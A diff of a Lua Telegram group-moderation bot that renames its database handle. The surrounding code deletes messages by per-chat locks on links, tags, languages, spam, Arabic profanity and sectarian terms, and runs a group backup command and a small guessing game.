 if msg.content_.caption_:match("[Hh][Tt][Tt][Pp][Ss]://") or msg.content_.caption_:match("[Hh][Tt][Tt][Pp]://") or msg.content_.caption_:match(".[Ii][Rr]") or msg.content_.caption_:match(".[Cc][Oo][Mm]") or msg.content_.caption_:match(".[Oo][Rr][Gg]") or msg.content_.caption_:match(".[Ii][Nn][Ff][Oo]") or msg.content_.caption_:match("[Ww][Ww][Ww].") or msg.content_.caption_:match(".[Xx][Yy][Zz]") or msg.content_.caption_:match(".[Tt][Kk]") or msg.content_.ID == "MessageEntityTextUrl" or msg.content_.ID == "MessageEntityUrl" then
-if DevBRAND:get(BRAND..'BRAND:Lock:WebLinks'..msg.chat_id_) then
+if DevABS:get(BRAND..'BRAND:Lock:WebLinks'..msg.chat_id_) then
 DeleteMessage(msg.chat_id_,{[0] = msg.id_})
 end
 end
 if msg.content_.caption_:match("[\216-\219][\128-\191]") then
-if DevBRAND:get(BRAND..'BRAND:Lock:Arabic'..msg.chat_id_) then
+if DevABS:get(BRAND..'BRAND:Lock:Arabic'..msg.chat_id_) then
 DeleteMessage(msg.chat_id_,{[0] = msg.id_})
 end
 end
 if msg.content_.caption_:match("[A-Z]") or msg.content_.caption_:match("[a-z]") then
-if DevBRAND:get(BRAND..'BRAND:Lock:English'..msg.chat_id_) then
+if DevABS:get(BRAND..'BRAND:Lock:English'..msg.chat_id_) then
 DeleteMessage(msg.chat_id_,{[0] = msg.id_})
 end
 end
@@ -2849,45 +2849,45 @@ end
 elseif msg.content_.ID == "MessageLocation" then
 if not VipMem(msg) then
 if msg.forward_info_ then
-if DevBRAND:get(BRAND..'BRAND:Lock:Forwards'..msg.chat_id_) then
+if DevABS:get(BRAND..'BRAND:Lock:Forwards'..msg.chat_id_) then
 if msg.forward_info_.ID == "MessageForwardedFromUser" or msg.forward_info_.ID == "MessageForwardedPost" then
 DeleteMessage(msg.chat_id_,{[0] = msg.id_})
 end
 end
 end
-if DevBRAND:get(BRAND..'BRAND:Lock:Location'..msg.chat_id_) then
+if DevABS:get(BRAND..'BRAND:Lock:Location'..msg.chat_id_) then
 DeleteMessage(msg.chat_id_,{[0] = msg.id_})
 return
 end
 if msg.content_.caption_ then
 Filters(msg, msg.content_.caption_)
-if DevBRAND:get(BRAND..'BRAND:Lock:Links'..msg.chat_id_) then
+if DevABS:get(BRAND..'BRAND:Lock:Links'..msg.chat_id_) then
 if msg.content_.caption_:match("[Tt][Ee][Ll][Ee][Gg][Rr][Aa][Mm].[Mm][Ee]") or msg.content_.caption_:match("[Tt][Ll][Gg][Rr][Mm].[Mm][Ee]") or msg.content_.caption_:match("[Tt].[Mm][Ee]") or msg.content_.caption_:match("[Tt][Ee][Ll][Ee][Gg][Rr][Aa][Mm].[Dd][Oo][Gg]") then
 DeleteMessage(msg.chat_id_,{[0] = msg.id_})
 end
 end
-if DevBRAND:get(BRAND..'BRAND:Lock:Tags'..msg.chat_id_) then
+if DevABS:get(BRAND..'BRAND:Lock:Tags'..msg.chat_id_) then
 if msg.content_.caption_:match("@") then
 DeleteMessage(msg.chat_id_,{[0] = msg.id_})
 end
 end
 if msg.content_.caption_:match("#") then
-if DevBRAND:get(BRAND..'BRAND:Lock:Hashtak'..msg.chat_id_) then
+if DevABS:get(BRAND..'BRAND:Lock:Hashtak'..msg.chat_id_) then
 DeleteMessage(msg.chat_id_,{[0] = msg.id_})
 end
 end
 if msg.content_.caption_:match("[Hh][Tt][Tt][Pp][Ss]://") or msg.content_.caption_:match("[Hh][Tt][Tt][Pp]://") or msg.content_.caption_:match(".[Ii][Rr]") or msg.content_.caption_:match(".[Cc][Oo][Mm]") or msg.content_.caption_:match(".[Oo][Rr][Gg]") or msg.content_.caption_:match(".[Ii][Nn][Ff][Oo]") or msg.content_.caption_:match("[Ww][Ww][Ww].") or msg.content_.caption_:match(".[Xx][Yy][Zz]") or msg.content_.caption_:match(".[Tt][Kk]") or msg.content_.ID == "MessageEntityTextUrl" or msg.content_.ID == "MessageEntityUrl" then
-if DevBRAND:get(BRAND..'BRAND:Lock:WebLinks'..msg.chat_id_) then
+if DevABS:get(BRAND..'BRAND:Lock:WebLinks'..msg.chat_id_) then
 DeleteMessage(msg.chat_id_,{[0] = msg.id_})
 end
 end
 if msg.content_.caption_:match("[\216-\219][\128-\191]") then
-if DevBRAND:get(BRAND..'BRAND:Lock:Arabic'..msg.chat_id_) then
+if DevABS:get(BRAND..'BRAND:Lock:Arabic'..msg.chat_id_) then
 DeleteMessage(msg.chat_id_,{[0] = msg.id_})
 end
 end
 if msg.content_.caption_:match("[A-Z]") or msg.content_.caption_:match("[a-z]") then
-if DevBRAND:get(BRAND..'BRAND:Lock:English'..msg.chat_id_) then
+if DevABS:get(BRAND..'BRAND:Lock:English'..msg.chat_id_) then
 DeleteMessage(msg.chat_id_,{[0] = msg.id_})
 end
 end
@@ -2898,44 +2898,44 @@ end
 elseif msg.content_.ID == "MessageVideo" then
 if not VipMem(msg) then
 if msg.forward_info_ then
-if DevBRAND:get(BRAND..'BRAND:Lock:Forwards'..msg.chat_id_) then
+if DevABS:get(BRAND..'BRAND:Lock:Forwards'..msg.chat_id_) then
 if msg.forward_info_.ID == "MessageForwardedFromUser" or msg.forward_info_.ID == "MessageForwardedPost" then
 DeleteMessage(msg.chat_id_,{[0] = msg.id_})
 end
 end
 end
-if DevBRAND:get(BRAND..'BRAND:Lock:Videos'..msg.chat_id_) then
+if DevABS:get(BRAND..'BRAND:Lock:Videos'..msg.chat_id_) then
 DeleteMessage(msg.chat_id_,{[0] = msg.id_})
 end
 if msg.content_.caption_ then
 Filters(msg, msg.content_.caption_)
-if DevBRAND:get(BRAND..'BRAND:Lock:Links'..msg.chat_id_) then
+if DevABS:get(BRAND..'BRAND:Lock:Links'..msg.chat_id_) then
 if msg.content_.caption_:match("[Tt][Ee][Ll][Ee][Gg][Rr][Aa][Mm].[Mm][Ee]") or msg.content_.caption_:match("[Tt][Ll][Gg][Rr][Mm].[Mm][Ee]") or msg.content_.caption_:match("[Tt].[Mm][Ee]") or msg.content_.caption_:match("[Tt][Ee][Ll][Ee][Gg][Rr][Aa][Mm].[Dd][Oo][Gg]") then
 DeleteMessage(msg.chat_id_,{[0] = msg.id_})
 end
 end
-if DevBRAND:get(BRAND..'BRAND:Lock:Tags'..msg.chat_id_) then
+if DevABS:get(BRAND..'BRAND:Lock:Tags'..msg.chat_id_) then
 if msg.content_.caption_:match("@") then
 DeleteMessage(msg.chat_id_,{[0] = msg.id_})
 end
 end
 if msg.content_.caption_:match("#") then
-if DevBRAND:get(BRAND..'BRAND:Lock:Hashtak'..msg.chat_id_) then
+if DevABS:get(BRAND..'BRAND:Lock:Hashtak'..msg.chat_id_) then
 DeleteMessage(msg.chat_id_,{[0] = msg.id_})
 end
 end
 if msg.content_.caption_:match("[Hh][Tt][Tt][Pp][Ss]://") or msg.content_.caption_:match("[Hh][Tt][Tt][Pp]://") or msg.content_.caption_:match(".[Ii][Rr]") or msg.content_.caption_:match(".[Cc][Oo][Mm]") or msg.content_.caption_:match(".[Oo][Rr][Gg]") or msg.content_.caption_:match(".[Ii][Nn][Ff][Oo]") or msg.content_.caption_:match("[Ww][Ww][Ww].") or msg.content_.caption_:match(".[Xx][Yy][Zz]") or msg.content_.caption_:match(".[Tt][Kk]") or msg.content_.ID == "MessageEntityTextUrl" or msg.content_.ID == "MessageEntityUrl" then
-if DevBRAND:get(BRAND..'BRAND:Lock:WebLinks'..msg.chat_id_) then
+if DevABS:get(BRAND..'BRAND:Lock:WebLinks'..msg.chat_id_) then
 DeleteMessage(msg.chat_id_,{[0] = msg.id_})
 end
 end
 if msg.content_.caption_:match("[\216-\219][\128-\191]") then
-if DevBRAND:get(BRAND..'BRAND:Lock:Arabic'..msg.chat_id_) then
+if DevABS:get(BRAND..'BRAND:Lock:Arabic'..msg.chat_id_) then
 DeleteMessage(msg.chat_id_,{[0] = msg.id_})
 end
 end
 if msg.content_.caption_:match("[A-Z]") or msg.content_.caption_:match("[a-z]") then
-if DevBRAND:get(BRAND..'BRAND:Lock:English'..msg.chat_id_) then
+if DevABS:get(BRAND..'BRAND:Lock:English'..msg.chat_id_) then
 DeleteMessage(msg.chat_id_,{[0] = msg.id_})
 end
 end
@@ -2946,44 +2946,44 @@ end
 elseif msg.content_.ID == "MessageAnimation" then
 if not VipMem(msg) then
 if msg.forward_info_ then
-if DevBRAND:get(BRAND..'BRAND:Lock:Forwards'..msg.chat_id_) then
+if DevABS:get(BRAND..'BRAND:Lock:Forwards'..msg.chat_id_) then
 if msg.forward_info_.ID == "MessageForwardedFromUser" or msg.forward_info_.ID == "MessageForwardedPost" then
 DeleteMessage(msg.chat_id_,{[0] = msg.id_})
 end
 end
 end
-if DevBRAND:get(BRAND..'BRAND:Lock:Gifs'..msg.chat_id_) then
+if DevABS:get(BRAND..'BRAND:Lock:Gifs'..msg.chat_id_) then
 DeleteMessage(msg.chat_id_,{[0] = msg.id_})
 end
 if msg.content_.caption_ then
 Filters(msg, msg.content_.caption_)
-if DevBRAND:get(BRAND..'BRAND:Lock:Links'..msg.chat_id_) then
+if DevABS:get(BRAND..'BRAND:Lock:Links'..msg.chat_id_) then
 if msg.content_.caption_:match("[Hh][Tt][Tt][Pp][Ss]://") or msg.content_.caption_:match("[Hh][Tt][Tt][Pp]://") then
 DeleteMessage(msg.chat_id_,{[0] = msg.id_})
 end
 end
-if DevBRAND:get(BRAND..'BRAND:Lock:Tags'..msg.chat_id_) then
+if DevABS:get(BRAND..'BRAND:Lock:Tags'..msg.chat_id_) then
 if msg.content_.caption_:match("@") then
 DeleteMessage(msg.chat_id_,{[0] = msg.id_})
 end
 end
 if msg.content_.caption_:match("#") then
-if DevBRAND:get(BRAND..'BRAND:Lock:Hashtak'..msg.chat_id_) then
+if DevABS:get(BRAND..'BRAND:Lock:Hashtak'..msg.chat_id_) then
 DeleteMessage(msg.chat_id_,{[0] = msg.id_})
 end
 end
 if msg.content_.caption_:match("[Hh][Tt][Tt][Pp][Ss]://") or msg.content_.caption_:match("[Hh][Tt][Tt][Pp]://") or msg.content_.caption_:match(".[Ii][Rr]") or msg.content_.caption_:match(".[Cc][Oo][Mm]") or msg.content_.caption_:match(".[Oo][Rr][Gg]") or msg.content_.caption_:match(".[Ii][Nn][Ff][Oo]") or msg.content_.caption_:match("[Ww][Ww][Ww].") or msg.content_.caption_:match(".[Xx][Yy][Zz]") or msg.content_.caption_:match(".[Tt][Kk]") or msg.content_.ID == "MessageEntityTextUrl" or msg.content_.ID == "MessageEntityUrl" then
-if DevBRAND:get(BRAND..'BRAND:Lock:WebLinks'..msg.chat_id_) then
+if DevABS:get(BRAND..'BRAND:Lock:WebLinks'..msg.chat_id_) then
 DeleteMessage(msg.chat_id_,{[0] = msg.id_})
 end
 end
 if msg.content_.caption_:match("[\216-\219][\128-\191]") then
-if DevBRAND:get(BRAND..'BRAND:Lock:Arabic'..msg.chat_id_) then
+if DevABS:get(BRAND..'BRAND:Lock:Arabic'..msg.chat_id_) then
 DeleteMessage(msg.chat_id_,{[0] = msg.id_})
 end
 end
 if msg.content_.caption_:match("[A-Z]") or msg.content_.caption_:match("[a-z]") then
-if DevBRAND:get(BRAND..'BRAND:Lock:English'..msg.chat_id_) then
+if DevABS:get(BRAND..'BRAND:Lock:English'..msg.chat_id_) then
 DeleteMessage(msg.chat_id_,{[0] = msg.id_})
 end
 end
@@ -2995,70 +2995,70 @@ elseif msg.content_.ID == "MessageText" then
 if not VipMem(msg) then
 Filters(msg,text)
 if msg.forward_info_ then
-if DevBRAND:get(BRAND..'BRAND:Lock:Forwards'..msg.chat_id_) then
+if DevABS:get(BRAND..'BRAND:Lock:Forwards'..msg.chat_id_) then
 if msg.forward_info_.ID == "MessageForwardedFromUser" or msg.forward_info_.ID == "MessageForwardedPost" then
 DeleteMessage(msg.chat_id_,{[0] = msg.id_})
 end
 end
 end
 if text:match("[Tt][Ee][Ll][Ee][Gg][Rr][Aa][Mm].[Mm][Ee]") or text:match("[Tt][Ll][Gg][Rr][Mm].[Mm][Ee]") or text:match("[Tt].[Mm][Ee]") or text:match("[Tt][Ee][Ll][Ee][Gg][Rr][Aa][Mm].[Dd][Oo][Gg]") then
-if DevBRAND:get(BRAND..'BRAND:Lock:Links'..msg.chat_id_) then
+if DevABS:get(BRAND..'BRAND:Lock:Links'..msg.chat_id_) then
 DeleteMessage(msg.chat_id_,{[0] = msg.id_})
 end
 end
-if DevBRAND:get(BRAND..'BRAND:Lock:Text'..msg.chat_id_) then
+if DevABS:get(BRAND..'BRAND:Lock:Text'..msg.chat_id_) then
 DeleteMessage(msg.chat_id_,{[0] = msg.id_})
 end
 if msg.content_.text_:match("@") then
-if DevBRAND:get(BRAND..'BRAND:Lock:Tags'..msg.chat_id_) then
+if DevABS:get(BRAND..'BRAND:Lock:Tags'..msg.chat_id_) then
 DeleteMessage(msg.chat_id_,{[0] = msg.id_})
 end
 end
 if msg.content_.text_:match("#") then
-if DevBRAND:get(BRAND..'BRAND:Lock:Hashtak'..msg.chat_id_) then
+if DevABS:get(BRAND..'BRAND:Lock:Hashtak'..msg.chat_id_) then
 DeleteMessage(msg.chat_id_,{[0] = msg.id_})
 end
 end
 if text:match("[Hh][Tt][Tt][Pp][Ss]://") or text:match("[Hh][Tt][Tt][Pp]://") or text:match(".[Ii][Rr]") or text:match(".[Cc][Oo][Mm]") or text:match(".[Oo][Rr][Gg]") or text:match(".[Ii][Nn][Ff][Oo]") or text:match("[Ww][Ww][Ww].") or text:match(".[Tt][Kk]") or text:match(".[Xx][Yy][Zz]") or msg.content_.ID == "MessageEntityTextUrl" or msg.content_.ID == "MessageEntityUrl" then
-if DevBRAND:get(BRAND..'BRAND:Lock:WebLinks'..msg.chat_id_) then
+if DevABS:get(BRAND..'BRAND:Lock:WebLinks'..msg.chat_id_) then
 DeleteMessage(msg.chat_id_,{[0] = msg.id_})
 end
 end
 if msg.content_.text_:match("[\216-\219][\128-\191]") then
-if DevBRAND:get(BRAND..'BRAND:Lock:Arabic'..msg.chat_id_) then
+if DevABS:get(BRAND..'BRAND:Lock:Arabic'..msg.chat_id_) then
 DeleteMessage(msg.chat_id_,{[0] = msg.id_})
 end
 end
 if msg.content_.text_ then
 local _nl, ctrl_chars = string.gsub(text, '%c', '')
 local _nl, real_digits = string.gsub(text, '%d', '')
-if not DevBRAND:get(BRAND..'BRAND:Spam:Text'..msg.chat_id_) then
+if not DevABS:get(BRAND..'BRAND:Spam:Text'..msg.chat_id_) then
 sens = 400
 else
-sens = tonumber(DevBRAND:get(BRAND..'BRAND:Spam:Text'..msg.chat_id_))
+sens = tonumber(DevABS:get(BRAND..'BRAND:Spam:Text'..msg.chat_id_))
 end
-if DevBRAND:get(BRAND..'BRAND:Lock:Spam'..msg.chat_id_) and string.len(msg.content_.text_) > (sens) or ctrl_chars > (sens) or real_digits > (sens) then
+if DevABS:get(BRAND..'BRAND:Lock:Spam'..msg.chat_id_) and string.len(msg.content_.text_) > (sens) or ctrl_chars > (sens) or real_digits > (sens) then
 DeleteMessage(msg.chat_id_,{[0] = msg.id_})
 end
 end
 if msg.content_.text_:match("[A-Z]") or msg.content_.text_:match("[a-z]") then
-if DevBRAND:get(BRAND..'BRAND:Lock:English'..msg.chat_id_) then
+if DevABS:get(BRAND..'BRAND:Lock:English'..msg.chat_id_) then
 DeleteMessage(msg.chat_id_,{[0] = msg.id_})
 end
 end
 end
 --     Source BRAND     --
-if DevBRAND:get(BRAND.."BRAND:Set:Groups:Links"..msg.chat_id_..msg.sender_user_id_) then
+if DevABS:get(BRAND.."BRAND:Set:Groups:Links"..msg.chat_id_..msg.sender_user_id_) then
 if text == "الغاء" then
 send(msg.chat_id_,msg.id_,"⌁︙تم الغاء حفظ الرابط")       
-DevBRAND:del(BRAND.."BRAND:Set:Groups:Links"..msg.chat_id_..msg.sender_user_id_) 
+DevABS:del(BRAND.."BRAND:Set:Groups:Links"..msg.chat_id_..msg.sender_user_id_) 
 return false
 end
 if msg.content_.text_:match("(https://telegram.me/joinchat/%S+)") or msg.content_.text_:match("(https://t.me/joinchat/%S+)") then
 local Link = msg.content_.text_:match("(https://telegram.me/joinchat/%S+)") or msg.content_.text_:match("(https://t.me/joinchat/%S+)")
-DevBRAND:set(BRAND.."BRAND:Groups:Links"..msg.chat_id_,Link)
+DevABS:set(BRAND.."BRAND:Groups:Links"..msg.chat_id_,Link)
 Dev_BRAND(msg.chat_id_, msg.id_, 1, '⌁︙تم حفظ الرابط بنجاح', 1, 'md')
-DevBRAND:del(BRAND.."BRAND:Set:Groups:Links"..msg.chat_id_..msg.sender_user_id_) 
+DevABS:del(BRAND.."BRAND:Set:Groups:Links"..msg.chat_id_..msg.sender_user_id_) 
 return false 
 end
 end
@@ -3066,77 +3066,77 @@ end
 local msg = data.message_
 text = msg.content_.text_
 if text and Constructor(msg) then 
-if DevBRAND:get('BRANDTTEAM:'..BRAND.."numadd:user"..msg.chat_id_.."" .. msg.sender_user_id_) then 
+if DevABS:get('BRANDTTEAM:'..BRAND.."numadd:user"..msg.chat_id_.."" .. msg.sender_user_id_) then 
 if text and text:match("^الغاء$") then 
-DevBRAND:del('BRANDTTEAM:'..BRAND..'id:user'..msg.chat_id_)  
+DevABS:del('BRANDTTEAM:'..BRAND..'id:user'..msg.chat_id_)  
 Dev_BRAND(msg.chat_id_, msg.id_, 1, '⌁︙تم الغاء الامر', 1, 'md')
-DevBRAND:del('BRANDTTEAM:'..BRAND.."numadd:user"..msg.chat_id_.."" .. msg.sender_user_id_)  
+DevABS:del('BRANDTTEAM:'..BRAND.."numadd:user"..msg.chat_id_.."" .. msg.sender_user_id_)  
 return false  end 
-DevBRAND:del('BRANDTTEAM:'..BRAND.."numadd:user"..msg.chat_id_.."" .. msg.sender_user_id_)  
+DevABS:del('BRANDTTEAM:'..BRAND.."numadd:user"..msg.chat_id_.."" .. msg.sender_user_id_)  
 local numadded = string.match(text, "(%d+)") 
-local iduserr = DevBRAND:get('BRANDTTEAM:'..BRAND..'id:user'..msg.chat_id_)  
-DevBRAND:incrby(BRAND..'BRAND:UsersMsgs'..msg.chat_id_..':'..iduserr,numadded)
+local iduserr = DevABS:get('BRANDTTEAM:'..BRAND..'id:user'..msg.chat_id_)  
+DevABS:incrby(BRAND..'BRAND:UsersMsgs'..msg.chat_id_..':'..iduserr,numadded)
 Dev_BRAND(msg.chat_id_, msg.id_,  1, "⌁︙تم اضافة "..numadded..' رساله', 1, 'md')
-DevBRAND:del('BRANDTTEAM:'..BRAND..'id:user'..msg.chat_id_) 
+DevABS:del('BRANDTTEAM:'..BRAND..'id:user'..msg.chat_id_) 
 end
 end
 if text and Constructor(msg) then 
-if DevBRAND:get('BRANDTTEAM:'..BRAND.."nmadd:user"..msg.chat_id_.."" .. msg.sender_user_id_) then 
+if DevABS:get('BRANDTTEAM:'..BRAND.."nmadd:user"..msg.chat_id_.."" .. msg.sender_user_id_) then 
 if text and text:match("^الغاء$") then 
-DevBRAND:del('BRANDTTEAM:'..BRAND..'ids:user'..msg.chat_id_)  
+DevABS:del('BRANDTTEAM:'..BRAND..'ids:user'..msg.chat_id_)  
 Dev_BRAND(msg.chat_id_, msg.id_, 1, '⌁︙تم الغاء الامر', 1, 'md')
-DevBRAND:del('BRANDTTEAM:'..BRAND.."nmadd:user"..msg.chat_id_.."" .. msg.sender_user_id_)  
+DevABS:del('BRANDTTEAM:'..BRAND.."nmadd:user"..msg.chat_id_.."" .. msg.sender_user_id_)  
 return false  end 
-DevBRAND:del('BRANDTTEAM:'..BRAND.."nmadd:user"..msg.chat_id_.."" .. msg.sender_user_id_)  
+DevABS:del('BRANDTTEAM:'..BRAND.."nmadd:user"..msg.chat_id_.."" .. msg.sender_user_id_)  
 local numadded = string.match(text, "(%d+)") 
-local iduserr = DevBRAND:get('BRANDTTEAM:'..BRAND..'ids:user'..msg.chat_id_)  
-DevBRAND:incrby(BRAND..'BRAND:GamesNumber'..msg.chat_id_..iduserr,numadded)  
+local iduserr = DevABS:get('BRANDTTEAM:'..BRAND..'ids:user'..msg.chat_id_)  
+DevABS:incrby(BRAND..'BRAND:GamesNumber'..msg.chat_id_..iduserr,numadded)  
 Dev_BRAND(msg.chat_id_, msg.id_,  1, "⌁︙تم اضافة "..numadded..' نقطه', 1, 'md')
-DevBRAND:del('BRANDTTEAM:'..BRAND..'ids:user'..msg.chat_id_)  
+DevABS:del('BRANDTTEAM:'..BRAND..'ids:user'..msg.chat_id_)  
 end
 end
 --     Source BRAND     --
 if text and (text:match("طيز") or text:match("ديس") or text:match("انيج") or text:match("نيج") or text:match("ديوس") or text:match("عير") or text:match("كسختك") or text:match("كسمك") or text:match("كسربك") or text:match("بلاع") or text:match("ابو العيوره") or text:match("منيوج") or text:match("كحبه") or text:match("كحاب") or text:match("الكحبه") or text:match("كسك") or text:match("طيزك") or text:match("كس امك") or text:match("صرم") or text:match("كس اختك")) then
-if not DevBRAND:get(BRAND.."BRAND:Lock:Fshar"..msg.chat_id_) and not VipMem(msg) then
+if not DevABS:get(BRAND.."BRAND:Lock:Fshar"..msg.chat_id_) and not VipMem(msg) then
 DeleteMessage(msg.chat_id_,{[0] = msg.id_})
 ReplyStatus(msg,msg.sender_user_id_,"WrongWay","⌁︙ممنوع الفشار في المجموعه")  
 end end
 if text and (text:match("ڬ") or text:match("ٺ") or text:match("چ") or text:match("ڇ") or text:match("ڿ") or text:match("ڀ") or text:match("ڎ") or text:match("ݫ") or text:match("ژ") or text:match("ڟ") or text:match("ݜ") or text:match("ڸ") or text:match("پ") or text:match("۴") or text:match("مک") or text:match("زدن") or text:match("دخترا") or text:match("دیوث") or text:match("کلیپشن") or text:match("خوششون") or text:match("میدا") or text:match("که") or text:match("بدانیم") or text:match("باید") or text:match("زناشویی") or text:match("آموزش") or text:match("راحتی") or text:match("خسته") or text:match("بیام") or text:match("بپوشم") or text:match("كرمه")) then
-if DevBRAND:get(BRAND.."BRAND:Lock:Farsi"..msg.chat_id_) and not VipMem(msg) then
+if DevABS:get(BRAND.."BRAND:Lock:Farsi"..msg.chat_id_) and not VipMem(msg) then
 DeleteMessage(msg.chat_id_,{[0] = msg.id_})
 ReplyStatus(msg,msg.sender_user_id_,"WrongWay","⌁︙ممنوع التكلم بالغه الفارسيه هنا")  
 end end
 if text and (text:match("ڬ") or text:match("ٺ") or text:match("چ") or text:match("ڇ") or text:match("ڿ") or text:match("ڀ") or text:match("ڎ") or text:match("ݫ") or text:match("ژ") or text:match("ڟ") or text:match("ݜ") or text:match("ڸ") or text:match("پ") or text:match("۴") or text:match("مک") or text:match("زدن") or text:match("دخترا") or text:match("دیوث") or text:match("کلیپشن") or text:match("خوششون") or text:match("میدا") or text:match("که") or text:match("بدانیم") or text:match("باید") or text:match("زناشویی") or text:match("آموزش") or text:match("راحتی") or text:match("خسته") or text:match("بیام") or text:match("بپوشم") or text:match("كرمه")) then
-if DevBRAND:get(BRAND.."BRAND:Lock:FarsiBan"..msg.chat_id_) and not VipMem(msg) then
+if DevABS:get(BRAND.."BRAND:Lock:FarsiBan"..msg.chat_id_) and not VipMem(msg) then
 DeleteMessage(msg.chat_id_,{[0] = msg.id_})
 ChatKick(msg.chat_id_, msg.sender_user_id_)
 end end 
 if text and (text:match("خره بالله") or text:match("خبربك") or text:match("كسدينربك") or text:match("خرب بالله") or text:match("خرب الله") or text:match("خره بربك") or text:match("الله الكواد") or text:match("خره بمحمد") or text:match("كسم الله") or text:match("كسم ربك") or text:match("كسربك") or text:match("كسختالله") or text:match("كسخت الله") or text:match("خره بدينك") or text:match("خرهبدينك") or text:match("كسالله") or text:match("خربالله")) then
-if not DevBRAND:get(BRAND.."BRAND:Lock:Kfr"..msg.chat_id_) and not VipMem(msg) then
+if not DevABS:get(BRAND.."BRAND:Lock:Kfr"..msg.chat_id_) and not VipMem(msg) then
 DeleteMessage(msg.chat_id_,{[0] = msg.id_})
 ReplyStatus(msg,msg.sender_user_id_,"WrongWay","⌁︙ممنوع الكفر في المجموعه") 
 end end
 if text and (text:match("سني نكس") or text:match("شيعه") or text:match("الشيعه") or text:match("السنه") or text:match("طائفتكم") or text:match("شيعي") or text:match("انا سني") or text:match("مسيحي") or text:match("يهودي") or text:match("صابئي") or text:match("ملحد") or text:match("بالسنه") or text:match("شيعة")) then
-if not DevBRAND:get(BRAND.."BRAND:Lock:Taf"..msg.chat_id_) and not VipMem(msg) then
+if not DevABS:get(BRAND.."BRAND:Lock:Taf"..msg.chat_id_) and not VipMem(msg) then
 DeleteMessage(msg.chat_id_,{[0] = msg.id_})
 ReplyStatus(msg,msg.sender_user_id_,"WrongWay","⌁︙ممنوع التكلم بالطائفيه هنا") 
 end end
 --     Source BRAND     --
 if SecondSudo(msg) then
 if text == 'جلب نسخه الكروبات' or text == 'جلب نسخه احتياطيه' or text == 'جلب النسخه الاحتياطيه' then
-local List = DevBRAND:smembers(BRAND..'BRAND:Groups') 
-local BotName = (DevBRAND:get(BRAND.."BRAND:NameBot") or 'بروكس')
+local List = DevABS:smembers(BRAND..'BRAND:Groups') 
+local BotName = (DevABS:get(BRAND.."BRAND:NameBot") or 'بروكس')
 local GetJson = '{"BotId": '..BRAND..',"BotName": "'..BotName..'","GroupsList":{'  
 for k,v in pairs(List) do 
-LinkGroups = DevBRAND:get(BRAND.."BRAND:Groups:Links"..v)
-Welcomes = DevBRAND:get(BRAND..'BRAND:Groups:Welcomes'..v) or ''
+LinkGroups = DevABS:get(BRAND.."BRAND:Groups:Links"..v)
+Welcomes = DevABS:get(BRAND..'BRAND:Groups:Welcomes'..v) or ''
 Welcomes = Welcomes:gsub('"',"") Welcomes = Welcomes:gsub("'","") Welcomes = Welcomes:gsub(",","") Welcomes = Welcomes:gsub("*","") Welcomes = Welcomes:gsub(";","") Welcomes = Welcomes:gsub("`","") Welcomes = Welcomes:gsub("{","") Welcomes = Welcomes:gsub("}","") 
-BRANDConstructors = DevBRAND:smembers(BRAND..'BRAND:BRANDConstructor:'..v)
-Constructors = DevBRAND:smembers(BRAND..'BRAND:BasicConstructor:'..v)
-BasicConstructors = DevBRAND:smembers(BRAND..'BRAND:Constructor:'..v)
-Managers = DevBRAND:smembers(BRAND..'BRAND:Managers:'..v)
-Admis = DevBRAND:smembers(BRAND..'BRAND:Admins:'..v)
-Vips = DevBRAND:smembers(BRAND..'BRAND:VipMem:'..v)
+BRANDConstructors = DevABS:smembers(BRAND..'BRAND:BRANDConstructor:'..v)
+Constructors = DevABS:smembers(BRAND..'BRAND:BasicConstructor:'..v)
+BasicConstructors = DevABS:smembers(BRAND..'BRAND:Constructor:'..v)
+Managers = DevABS:smembers(BRAND..'BRAND:Managers:'..v)
+Admis = DevABS:smembers(BRAND..'BRAND:Admins:'..v)
+Vips = DevABS:smembers(BRAND..'BRAND:VipMem:'..v)
 if k == 1 then
 GetJson = GetJson..'"'..v..'":{'
 else
@@ -3232,29 +3232,29 @@ tdcli_function ({ ID = "GetMessage", chat_id_ = msg.chat_id_, message_id_ = tonu
 end
 end
 --     Source BRAND     --
-if DevBRAND:get(BRAND.."SET:GAME"..msg.chat_id_) then  
+if DevABS:get(BRAND.."SET:GAME"..msg.chat_id_) then  
 if text and text:match("^(%d+)$") then
 local NUM = text:match("^(%d+)$")
 if tonumber(NUM) > 6 then
 Dev_BRAND( msg.chat_id_, msg.id_, 1,"⌁︙يوجد فقط ( 6 ) اختيارات\n⌁︙ارسل اختيارك مره اخرى", 1, "md")    
 return false  end 
-local GETNUM = DevBRAND:get(BRAND.."GAMES"..msg.chat_id_)
+local GETNUM = DevABS:get(BRAND.."GAMES"..msg.chat_id_)
 if tonumber(NUM) == tonumber(GETNUM) then
-DevBRAND:del(BRAND.."SET:GAME"..msg.chat_id_)   
+DevABS:del(BRAND.."SET:GAME"..msg.chat_id_)   
 Dev_BRAND( msg.chat_id_, msg.id_, 1,'⌁︙*المحيبس باليد رقم* ↫ '..NUM..'\n⌁︙*مبروك لقد ربحت وحصلت على 5 نقاط يمكنك استبدالها بالرسائل*', 1, "md") 
-DevBRAND:incrby(BRAND..'BRAND:GamesNumber'..msg.chat_id_..msg.sender_user_id_,5)  
+DevABS:incrby(BRAND..'BRAND:GamesNumber'..msg.chat_id_..msg.sender_user_id_,5)  
 elseif tonumber(NUM) ~= tonumber(GETNUM) then
-DevBRAND:del(BRAND.."SET:GAME"..msg.chat_id_)   
+DevABS:del(BRAND.."SET:GAME"..msg.chat_id_)   
 Dev_BRAND( msg.chat_id_, msg.id_, 1,'⌁︙*المحيبس باليد رقم* ↫ '..GETNUM..'\n⌁︙*للاسف لقد خسرت حاول مره اخرى للعثور على المحيبس*', 1, "md")
 end
 end
 end
-if DevBRAND:get(BRAND..'DevBRAND4'..msg.sender_user_id_) then
+if DevABS:get(BRAND..'DevABS4'..msg.sender_user_id_) then
 if text and text:match("^الغاء$") then 
 send(msg.chat_id_, msg.id_, "⌁︙تم الغاء الامر")
-DevBRAND:del(BRAND..'DevBRAND4'..msg.sender_user_id_)
+DevABS:del(BRAND..'DevABS4'..msg.sender_user_id_)
 return false  end 
-DevBRAND:del(BRAND..'DevBRAND4'..msg.sender_user_id_)
+DevABS:del(BRAND..'DevABS4'..msg.sender_user_id_)
 local username = string.match(text, "@[%a%d_]+") 
 tdcli_function({ID = "SearchPublicChat",username_ = username},function(arg,data) 
 if data and data.message_ and data.message_ == "USERNAME_NOT_OCCUPIED" then 
@@ -3269,7 +3269,7 @@ return false  end
 if data and data.type_ and data.type_.channel_ and data.type_.channel_.is_supergroup_ == false then
 if data and data.type_ and data.type_.channel_ and data.type_.channel_.ID and data.type_.channel_.status_.ID == 'ChatMemberStatusEditor' then
